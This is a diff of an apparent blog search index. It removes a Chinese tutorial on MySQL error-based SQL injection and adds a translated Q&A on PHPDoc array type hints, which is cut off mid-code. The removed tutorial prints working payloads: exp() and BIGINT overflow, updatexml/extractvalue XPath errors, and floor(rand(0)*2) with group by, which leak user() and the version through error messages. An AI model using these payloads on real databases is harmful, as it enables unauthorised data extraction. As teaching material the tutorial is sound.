@@ -3,153 +3,93 @@
   
     
     <entry>
-      <title><![CDATA[Mysql注入后利用]]></title>
-      <url>/2018/01/06/mysql-injection/</url>
-      <content type="html"><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
-<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
-<ol>
-<li>BIGINT等数据类型溢出</li>
-<li>xpath语法错误</li>
-<li>concat+rand()+group_by()导致主键重复</li>
-<li>一些特性</li>
-</ol>
-<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
-<a id="more"></a>
-<h2 id="0x01-数据溢出"><a href="#0x01-数据溢出" class="headerlink" title="0x01 数据溢出"></a>0x01 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" target="_blank" rel="noopener">Integer Types (Exact Value)</a>，如下表：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://edu.aqniu.com/files/default/2017/03-08/142134e6bab6545212.jpg" alt="img" title="">
-                </div>
-                <div class="image-caption">img</div>
-            </figure>
-<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'(18446744073709551615 + 1)'</span></span><br></pre></td></tr></table></figure>
-<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos;</span><br></pre></td></tr></table></figure>
-<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>同理，利用exp函数也会产生类似的溢出错误：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</span><br></pre></td></tr></table></figure>
-<p>注入姿势：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure>
-<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(&apos;root@localhost&apos;)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
-<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(`a`.`x`)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
-<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-xpath语法错误"><a href="#0x02-xpath语法错误" class="headerlink" title="0x02 xpath语法错误"></a>0x02 xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&apos;/a/b&apos;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&apos;/a/b&apos;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
-<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-主键重复"><a href="#0x03-主键重复" class="headerlink" title="0x03 主键重复"></a>0x03 主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
-<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
-<p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
-<ul>
-<li>先是建立虚拟表，其中key为主键，不可重复：</li>
+      <title><![CDATA[PHPDoc类型提示数组的对象]]></title>
+      <url>/2018/01/28/PHPDoc-type-hinting-for-array-of-objects/</url>
+      <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>因此，在PHPDoc中，可以在成员变量声明之上指定<code>@var</code>来提示其类型。然后一个IDE，例如PHPEd将知道它正在使用什么类型的对象，并且能够为该变量提供代码洞察。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="comment">/** <span class="doctag">@var</span> SomeObj */</span></span><br><span class="line"> <span class="keyword">private</span> $someObjInstance;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>这样做很好，直到我需要对一组对象做同样的事情，以便在以后迭代这些对象时才能获得正确的提示。</p>
+<p>那么，有没有办法声明一个PHPDoc标签来指定成员变量是<code>SomeObj</code>的数组？ <code>@var</code>数组是不够的，例如<code>@var array(SomeObj)</code>似乎没有效果。</p>
+<h2 id="最佳解决方案"><a href="#最佳解决方案" class="headerlink" title="最佳解决方案"></a>最佳解决方案</h2><p>你能做的最好的就是说</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($Objs <span class="keyword">as</span> $Obj)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* <span class="doctag">@var</span> $Obj Test */</span></span><br><span class="line"> <span class="comment">// You should be able to get hinting after the preceding line if you type $Obj-&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我在Zend Studio中做了很多工作。不知道其他编辑，但它应该工作。</p>
+<h2 id="次佳解决方案"><a href="#次佳解决方案" class="headerlink" title="次佳解决方案"></a>次佳解决方案</h2><p>在JetBrains的PhpStorm IDE中，您可以使用<code>/** @var SomeObj[] */</code>，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SomeObj[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSomeObjects</span><span class="params">()</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://segmentfault.com/link.php?target=http%3A//phpdoc.org/docs/latest/references/phpdoc/types.html%23arrays" target="_blank" rel="noopener">phpdoc documentation</a>推荐这种方法：</p>
+<blockquote>
+<p>specified containing a single type, the Type definition informs the reader of the type of each array element. Only one Type is then expected as element for a given array.</p>
+<p>Example: <code>@return int[]</code></p>
+</blockquote>
+<h2 id="第三种解决方案"><a href="#第三种解决方案" class="headerlink" title="第三种解决方案"></a>第三种解决方案</h2><p>Netbeans提示：</p>
+<p>您可以在<code>$users[0]-&gt;</code>和<code>$this-&gt;</code>上获取用户类数组的代码完成。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> User[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> $users = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure>
+<p>当您完成<code>$this-&gt;...</code>时，您还可以看到类成员列表中的数组类型</p>
+<h2 id="第四种方案"><a href="#第四种方案" class="headerlink" title="第四种方案"></a>第四种方案</h2><p>指定变量是一个对象数组：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$needles = getAllNeedles();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $needles Needle[] */</span></span><br><span class="line">$needles[<span class="number">1</span>]-&gt;... <span class="comment">//codehinting works</span></span><br></pre></td></tr></table></figure>
+<p>这在Netbeans 7.2(我正在使用它)</p>
+<p>还有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$needles = getAllNeedles();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $needles Needle[] */</span></span><br><span class="line"><span class="keyword">foreach</span> ($needles <span class="keyword">as</span> $needle) &#123;</span><br><span class="line"> $needle-&gt;... <span class="comment">//codehinting works</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因此在<code>foreach</code>中使用声明是不必要的。</p>
+<h2 id="第五种方案"><a href="#第五种方案" class="headerlink" title="第五种方案"></a>第五种方案</h2><p>我更喜欢阅读和编写干净的代码 – 如Robert C. Martin的”Clean Code”所述。当遵循他的信条时，您不应要求开发人员(作为您的API的用户)知道数组的(内部)结构。</p>
+<p>API用户可能会问：这是仅一维的数组吗？物体是否在多维数组的各个层次上传播？我需要访问所有对象有多少个嵌套循环(foreach等)？什么类型的对象是该数组中的”stored”？</p>
+<p>如您所概述的，您希望将该数组(其中包含对象)用作一维数组。</p>
+<p>正如Nishi所概述的，你可以使用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> SomeObj[]</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+<p>为了那个原因。</p>
+<p>但再次：请注意 – 这不是一个标准的docblock符号。这种符号是由一些IDE生产者引入的。</p>
+<p>好的，作为一名开发人员，您知道”[]”与PHP中的数组绑定。但是在正常的PHP上下文中”something[]”是什么意思？ “[]”意味着：在”something”中创建新元素。新的元素可以是一切。但是你想表达的是：具有相同类型的对象的数组，它的确切类型。您可以看到，IDE生产者引入了一个新的上下文。你必须学习的一个新的背景。 PHP开发人员必须学习的新环境(了解您的docblocks)。坏风格(！)。</p>
+<p>因为你的数组确实有一个维度，你可能想要将这个“数组的对象”称为”list”。请注意，”list”在其他编程语言中具有非常特殊的意义。它会被更好地称为”collection”为例。</p>
+<p>记住：您使用一种编程语言，可以为您提供OOP的所有选项。使用类而不是数组，并使类像数组一样遍历。例如。：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">orderCollection</span> <span class="keyword">implements</span> <span class="title">ArrayIterator</span></span></span><br></pre></td></tr></table></figure>
+<p>或者如果要将内部对象存储在多维数组/对象结构中的不同级别上：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">orderCollection</span> <span class="keyword">implements</span> <span class="title">RecursiveArrayIterator</span></span></span><br></pre></td></tr></table></figure>
+<p>此解决方案将使用”orderCollection”类型的对象替换您的数组，但是到目前为止，不能在IDE中启用代码完成。好的。下一步：</p>
+<p>实现与docblock接口引入的方法 – 特别是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::current()</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> integer E.g. database identifier of the order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::key()</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">orderCollection::offsetGet()</span><br></pre></td></tr></table></figure>
+<p>不要忘记使用类型提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orderCollection::append(Order $order)</span><br><span class="line">orderCollection::offsetSet(Order $order)</span><br></pre></td></tr></table></figure>
+<p>这个解决方案停止引入很多：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@var</span> $key ... */</span></span><br><span class="line"><span class="comment">/** <span class="doctag">@var</span> $value ... */</span></span><br></pre></td></tr></table></figure>
+<p>所有的代码文件(例如循环内)，因为Zahymaka证实了他/他的答案。您的API用户不会被迫引用该文档块，以使代码完成。要只在一个地方有@return可以减少冗余(@var)作为mutch尽可能的。使用@var“docBlocks”会使您的代码变得最不可读。</p>
+<p>最后你完成了看起来很难看看起来像大锤打破一个坚果？不是真的，因为你熟悉那些接口和干净的代码。记住：你的源代码是一次写/读很多。</p>
+<p>如果IDE的代码完成无法使用此方法，请切换到更好的(例如IntelliJ IDEA，PhpStorm，Netbeans)或在IDE生成器的问题跟踪器上提交功能请求。</p>
+<p>感谢Christian Weiss(来自德国)担任我的教练，并教我如此伟大的东西。 PS：在邢会见我和他</p>
+<h2 id="第六种方案"><a href="#第六种方案" class="headerlink" title="第六种方案"></a>第六种方案</h2><p><a href="https://segmentfault.com/link.php?target=https%3A//github.com/php-fig/fig-standards/blob/211063eed7f4d9b4514b728d7b1810d9b3379dd1/proposed/phpdoc.md%23collections" target="_blank" rel="noopener">PSR-5: PHPDoc</a>提出了一种形式的Generics-style表示法。</p>
+<h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type[]</span><br><span class="line">Type&lt;Type&gt;</span><br><span class="line">Type&lt;Type[, Type]...&gt;</span><br><span class="line">Type&lt;Type[|Type]...&gt;</span><br></pre></td></tr></table></figure>
+<p>集合中的值可能甚至是另一个数组，甚至另一个集合。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type&lt;Type&lt;Type&gt;&gt;</span><br><span class="line">Type&lt;Type&lt;Type[, Type]...&gt;&gt;</span><br><span class="line">Type&lt;Type&lt;Type[|Type]...&gt;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$x = [<span class="keyword">new</span> Name()];</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $x Name[] */</span></span><br><span class="line"></span><br><span class="line">$y = <span class="keyword">new</span> Collection([<span class="keyword">new</span> Name()]);</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $y Collection&lt;Name&gt; */</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Collection(); </span><br><span class="line">$a[] = <span class="keyword">new</span> Model_User(); </span><br><span class="line">$a-&gt;resetChanges(); </span><br><span class="line">$a[<span class="number">0</span>]-&gt;name = <span class="string">"George"</span>; </span><br><span class="line">$a-&gt;echoChanges();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $a Collection&lt;Model_User&gt; */</span></span><br></pre></td></tr></table></figure>
+<p>注意：如果您期望IDE执行代码辅助，那么另一个问题是IDE是否支持PHPDoc Generic-style集合符号。</p>
+<p>从我的答案到<a href="https://segmentfault.com/link.php?target=https%3A//stackoverflow.com/a/39384337/934739" target="_blank" rel="noopener">this question</a>。</p>
+<h2 id="第七种方案"><a href="#第七种方案" class="headerlink" title="第七种方案"></a>第七种方案</h2><p>在NetBeans 7.0(也可能较低)中，您可以声明返回类型“具有文本对象的数组”，就像<code>@return Text</code>一样，并且代码提示将起作用：</p>
+<p>编辑：使用@Bob Fanger建议更新示例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * get all Tests</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Test|Array $tests</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllTexts</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">array</span>(<span class="keyword">new</span> Test(), <span class="keyword">new</span> Test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只需使用它：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$tests = $controller-&gt;getAllTests();</span><br><span class="line"><span class="comment">//$tests-&gt; //codehinting works!</span></span><br><span class="line"><span class="comment">//$tests[0]-&gt; //codehinting works!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($tests <span class="keyword">as</span> $text)&#123;</span><br><span class="line"> <span class="comment">//$test-&gt; //codehinting works!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它不是完美的，但最好只是离开它只是”mixed”，女巫没有带来价值。</p>
+<p>CONS是你被允许以数组为背景，因为文本对象将会抛出错误。</p>
+<h2 id="第八种方案"><a href="#第八种方案" class="headerlink" title="第八种方案"></a>第八种方案</h2><p><strong>在Zend Studio中使用array[type]。</strong></p>
+<p>在Zend Studio中，<code>array[MyClass]</code>或<code>array[int]</code>甚至<code>array[array[MyClass]]</code>都很棒。</p>
+<h2 id="第九种方案"><a href="#第九种方案" class="headerlink" title="第九种方案"></a>第九种方案</h2><p>正如DanielaWaranie在答案中提到的那样 – 当您在$ collectionObject中迭代$ items时，有一种方法来指定$ item的类型：将<code>@return MyEntitiesClassName</code>添加到<code>current()</code>以及返回值的<code>Iterator</code>和<code>Iterator</code>和<code>ArrayAccess</code>方法的其余部分。</p>
+<p>繁荣！ <code>/** @var SomeObj[] $collectionObj */</code>不需要<code>foreach</code>，并且与收藏对象一起使用，无需以<code>@return SomeObj[]</code>描述的特定方法返回收藏。</p>
+<p>我怀疑并不是所有的IDE都支持它，但它在PhpStorm中工作得很好，这让我更开心。</p>
+<p><strong>例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">MyCollection</span> <span class="keyword">implements</span> <span class="title">Countable</span>, <span class="title">Iterator</span>, <span class="title">ArrayAccess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> User</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;items[<span class="keyword">$this</span>-&gt;cursor];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//... implement rest of the required `interface` methods and your custom</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="有什么有用的我会添加发布这个答案"><a href="#有什么有用的我会添加发布这个答案" class="headerlink" title="有什么有用的我会添加发布这个答案"></a>有什么有用的我会添加发布这个答案</h3><p>在我的情况下，<code>current()</code>和<code>interface</code>方法的其余部分在<code>Abstract</code> -collection类中实现，我不知道最终将在集合中存储什么样的实体。</p>
+<p>所以这里是窍门：不要在抽象类中指定返回类型，而是在特定的集合类的描述中使用PhpDoc instuction <code>@method</code>。</p>
+<p><strong>例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span 